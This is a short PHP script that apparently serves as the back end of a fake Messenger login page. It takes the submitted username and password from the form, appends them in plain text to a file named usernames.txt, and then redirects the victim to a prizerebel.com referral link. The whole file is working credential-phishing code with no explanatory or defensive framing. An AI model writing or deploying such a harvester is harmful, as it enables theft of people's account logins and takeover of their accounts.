<?php

file_put_contents("usernames.txt", "Messenger Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.prizerebel.com/index.php?r=13123486');
exit();
?>
